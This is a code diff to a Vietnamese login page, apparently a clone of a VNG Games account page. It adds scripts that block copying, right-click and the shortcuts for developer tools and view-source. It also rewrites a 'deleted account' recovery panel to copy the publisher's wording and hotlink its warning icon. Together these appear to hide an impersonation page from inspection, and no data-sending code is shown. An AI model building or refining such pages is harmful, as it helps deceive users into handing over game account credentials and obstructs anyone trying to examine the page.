@@ -7,6 +7,68 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="stylesheet" href="login.css">
+    <style>
+body{
+-webkit-touch-callout: none;
+-webkit-user-select: none;
+-moz-user-select: none;
+-ms-user-select: none;
+-o-user-select: none;
+user-select: none;
+}
+</style><script type=”text/JavaScript”>
+function killCopy(e){
+return false
+}
+function reEnable(){
+return true
+}
+document.onselectstart=new Function (“return false”)
+if (window.sidebar){
+document.onmousedown=killCopy
+document.onclick=reEnable
+}
+</script>
+<script language="JavaScript">
+    window.onload = function() {
+        document.addEventListener("contextmenu", function(e) {
+            e.preventDefault();
+        }, false);
+        document.addEventListener("keydown", function(e) {
+            //document.onkeydown = function(e) {
+            // "I" key
+            if (e.ctrlKey && e.shiftKey && e.keyCode == 73) {
+                disabledEvent(e);
+            }
+            // "J" key
+            if (e.ctrlKey && e.shiftKey && e.keyCode == 74) {
+                disabledEvent(e);
+            }
+            // "S" key + macOS
+            if (e.keyCode == 83 && (navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)) {
+                disabledEvent(e);
+            }
+            // "U" key
+            if (e.ctrlKey && e.keyCode == 85) {
+                disabledEvent(e);
+            }
+            // "F12" key
+            if (event.keyCode == 123) {
+                disabledEvent(e);
+            }
+        }, false);
+ 
+        function disabledEvent(e) {
+            if (e.stopPropagation) {
+                e.stopPropagation();
+            } else if (window.event) {
+                window.event.cancelBubble = true;
+            }
+            e.preventDefault();
+            return false;
+        }
+    };
+</script>
 </head>
 <body>
     <!--Start of Tawk.to Script-->
@@ -132,11 +194,11 @@
                 <!-- ===== FORM TÀI KHOẢN ĐÃ XÓA ===== -->
                 <div id="deleted-form" class="form-panel">
                     <div class="lock-icon-restore">
-                        <i class="fas fa-trash-alt"></i>
+                        <img src="https://cdn-gg.vnggames.app/id/0.4.76/static/media/warning.3a7e959ee00bcf8cd30b7ab33be6ca99.svg" alt="">
                     </div>
-                    <div class="form-title" style="color: var(--primary); text-align: center;">Tài khoản đã bị xóa</div>
+                    <div class="form-title" style="color: black; text-align: center;">Hiện tại bạn không thể truy cập vào tài khoản này</div>
                     <div class="form-sub" style="text-align: center;">
-                        Tài khoản của bạn đã được yêu cầu xóa. Bạn có thể khôi phục trong vòng <strong>7 ngày</strong>.
+                        Bạn đã gửi yêu cầu xóa tài khoản hoặc rút lại sự đồng ý với điều khoản dịch vụ. Bạn có <strong>7 ngày</strong> kể từ lúc gửi yêu cầu để khôi phục lại tài khoản trước khi bị xoá vĩnh viễn.
                     </div>
                     
                     <div id="deletedInfoContent" style="background: #f8f9fa; border-radius: 8px; overflow: hidden; margin: 12px 0;">
